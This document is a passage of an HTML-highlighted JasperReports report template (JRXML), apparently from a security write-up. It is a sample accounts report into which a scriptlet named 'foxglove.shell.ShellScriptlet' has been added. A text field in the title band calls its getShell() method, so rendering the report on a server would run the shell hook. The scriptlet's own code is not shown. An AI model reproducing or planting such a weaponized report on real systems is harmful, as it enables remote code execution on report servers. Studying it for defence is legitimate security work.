+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div><div class="line"><span class="comment">&lt;!-- Created with Jaspersoft Studio version 6.0.1.final using JasperReports Library version 6.0.0 --&gt;</span></div><div class="line"><span class="comment">&lt;!-- 2016-10-04T14:01:12 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jasperReport</span> <span class="attr">xmlns</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd"</span> <span class="attr">name</span>=<span class="string">"AllAccounts"</span> <span class="attr">pageWidth</span>=<span class="string">"595"</span> <span class="attr">pageHeight</span>=<span class="string">"842"</span> <span class="attr">whenNoDataType</span>=<span class="string">"AllSectionsNoDetail"</span> <span class="attr">columnWidth</span>=<span class="string">"515"</span> <span class="attr">leftMargin</span>=<span class="string">"40"</span> <span class="attr">rightMargin</span>=<span class="string">"40"</span> <span class="attr">topMargin</span>=<span class="string">"50"</span> <span class="attr">bottomMargin</span>=<span class="string">"50"</span> <span class="attr">isSummaryWithPageHeaderAndFooter</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"17f4b3c5-e096-4a65-b030-ed3bb58ce311"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.language"</span> <span class="attr">value</span>=<span class="string">"EN-US"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Normal"</span> <span class="attr">isDefault</span>=<span class="string">"true"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Bold"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span> <span class="attr">isBold</span>=<span class="string">"true"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Italic"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span> <span class="attr">isItalic</span>=<span class="string">"true"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"PageHeader"</span> <span class="attr">style</span>=<span class="string">"Sans_Bold"</span> <span class="attr">forecolor</span>=<span class="string">"#FFFFFF"</span> <span class="attr">backcolor</span>=<span class="string">"#333333"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"detail"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span>&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">conditionalStyle</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">conditionExpression</span>&gt;</span>&lt;![CDATA[new Boolean($V&#123;CityGroup_COUNT&#125;.intValue() % 2 == 0)]]&gt;<span class="tag">&lt;/<span class="name">conditionExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">backcolor</span>=<span class="string">"#E0E0E0"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;/<span class="name">conditionalStyle</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">subDataset</span> <span class="attr">name</span>=<span class="string">"Table Dataset 1"</span> <span class="attr">uuid</span>=<span class="string">"4fcc1d09-9859-48ee-bb6f-8d369bd49113"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">queryString</span>&gt;</span></div><div class="line">&lt;![CDATA[SELECT name, phone_office, billing_address_city, billing_address_street, billing_address_country FROM accounts ORDER BY billing_address_country, billing_address_city]]&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">queryString</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"phone_office"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_city"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_street"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_country"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">sortField</span> <span class="attr">name</span>=<span class="string">"billing_address_country"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">sortField</span> <span class="attr">name</span>=<span class="string">"billing_address_city"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">variable</span> <span class="attr">name</span>=<span class="string">"CityyNumber"</span> <span class="attr">class</span>=<span class="string">"java.lang.Integer"</span> <span class="attr">incrementType</span>=<span class="string">"Group"</span> <span class="attr">incrementGroup</span>=<span class="string">"CityGroup"</span> <span class="attr">calculation</span>=<span class="string">"Count"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">variableExpression</span>&gt;</span>&lt;![CDATA[Boolean.TRUE]]&gt;<span class="tag">&lt;/<span class="name">variableExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">initialValueExpression</span>&gt;</span>&lt;![CDATA[new Integer(0)]]&gt;<span class="tag">&lt;/<span class="name">initialValueExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">variable</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">"CityGroup"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">groupExpression</span>&gt;</span>&lt;![CDATA[$F&#123;billing_address_city&#125;]]&gt;<span class="tag">&lt;/<span class="name">groupExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">subDataset</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">scriptlet</span> <span class="attr">name</span>=<span class="string">"ShellScriptlet"</span> <span class="attr">class</span>=<span class="string">"foxglove.shell.ShellScriptlet"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">scriptletDescription</span>&gt;</span>&lt;![CDATA[]]&gt;<span class="tag">&lt;/<span class="name">scriptletDescription</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"79"</span> <span class="attr">splitType</span>=<span class="string">"Stretch"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"227"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">uuid</span>=<span class="string">"32a2a8ff-d90a-48d7-b044-5325b5c6264f"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">pageFooter</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"40"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">line</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"10"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"1"</span> <span class="attr">uuid</span>=<span class="string">"19826638-0487-4bb5-9b15-7e7af63b8dce"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.table"</span> <span class="attr">value</span>=<span class="string">"end"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">line</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"200"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"80"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">uuid</span>=<span class="string">"6f072af1-756c-49f4-82f3-af59e8124296"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Right"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Page " + String.valueOf($V&#123;PAGE_NUMBER&#125;) + " of"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span> <span class="attr">evaluationTime</span>=<span class="string">"Report"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"280"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"75"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">uuid</span>=<span class="string">"02b15e9e-d360-4b82-a140-54b9bd3b0e81"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Left"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" " + String.valueOf($V&#123;PAGE_NUMBER&#125;)]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">pageFooter</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">summary</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"149"</span> <span class="attr">splitType</span>=<span class="string">"Stretch"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">scaleImage</span>=<span class="string">"Clip"</span> <span class="attr">hAlign</span>=<span class="string">"Right"</span> <span class="attr">vAlign</span>=<span class="string">"Middle"</span> <span class="attr">onErrorType</span>=<span class="string">"Icon"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"71"</span> <span class="attr">width</span>=<span class="string">"250"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"aa8a8976-039f-45ac-84f3-d8d55b442410"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">imageExpression</span>&gt;</span>&lt;![CDATA["repo:LogoLink"]]&gt;<span class="tag">&lt;/<span class="name">imageExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">hyperlinkTooltipExpression</span>&gt;</span>&lt;![CDATA["JasperReports Logo"]]&gt;<span class="tag">&lt;/<span class="name">hyperlinkTooltipExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">scaleImage</span>=<span class="string">"Clip"</span> <span class="attr">hAlign</span>=<span class="string">"Right"</span> <span class="attr">vAlign</span>=<span class="string">"Middle"</span> <span class="attr">onErrorType</span>=<span class="string">"Icon"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">x</span>=<span class="string">"265"</span> <span class="attr">y</span>=<span class="string">"71"</span> <span class="attr">width</span>=<span class="string">"250"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"4b5dd0d1-9011-42cf-ab07-f80c02d3d166"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">imageExpression</span>&gt;</span>&lt;![CDATA["repo:AllAccounts_Res2"]]&gt;<span class="tag">&lt;/<span class="name">imageExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">hyperlinkTooltipExpression</span>&gt;</span>&lt;![CDATA["Jaspersoft Logo"]]&gt;<span class="tag">&lt;/<span class="name">hyperlinkTooltipExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">componentElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">key</span>=<span class="string">"table"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"db3dd84a-3743-43b3-ab7e-c4aebdb907df"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:table</span> <span class="attr">xmlns:jr</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports/components"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports/components http://jasperreports.sourceforge.net/xsd/components.xsd"</span> <span class="attr">whenNoDataType</span>=<span class="string">"AllSectionsNoDetail"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">datasetRun</span> <span class="attr">subDataset</span>=<span class="string">"Table Dataset 1"</span> <span class="attr">uuid</span>=<span class="string">"3b2a079f-f600-46a6-a7af-720c4e939e7e"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">connectionExpression</span>&gt;</span>&lt;![CDATA[$P&#123;REPORT_CONNECTION&#125;]]&gt;<span class="tag">&lt;/<span class="name">connectionExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">datasetRun</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnGroup</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">uuid</span>=<span class="string">"1e5d630a-c8f9-4dbb-8415-393f7624ca35"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:groupHeader</span> <span class="attr">groupName</span>=<span class="string">"CityGroup"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:cell</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"Sans_Bold"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"14"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">backcolor</span>=<span class="string">"#C0C0C0"</span> <span class="attr">uuid</span>=<span class="string">"aeafecc2-ef7e-435c-ae07-1f45ed6b179a"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Left"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" " + String.valueOf($V&#123;CityyNumber&#125;.intValue() + 1) + ". " + $F&#123;billing_address_city&#125;+ ", " + $F&#123;billing_address_country&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">anchorNameExpression</span>&gt;</span>&lt;![CDATA[String.valueOf($F&#123;billing_address_city&#125;)]]&gt;<span class="tag">&lt;/<span class="name">anchorNameExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:cell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:groupHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">uuid</span>=<span class="string">"43ffff20-e89f-4f73-ad8d-878e9581274a"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"a76dcb9c-8601-48bc-b9cc-3d1c316e537d"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.colspan"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" "]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"73a40f28-2c08-4849-a2a9-b83ade7a6b7d"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"10"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Right"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$V&#123;CityGroup_COUNT&#125;+"."]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">uuid</span>=<span class="string">"d472eeed-282a-402b-9044-a397ca270655"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"bd0d4582-5684-4e15-8623-b3f1940bf1bb"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.colspan"</span> <span class="attr">value</span>=<span class="string">"2"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Name"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span 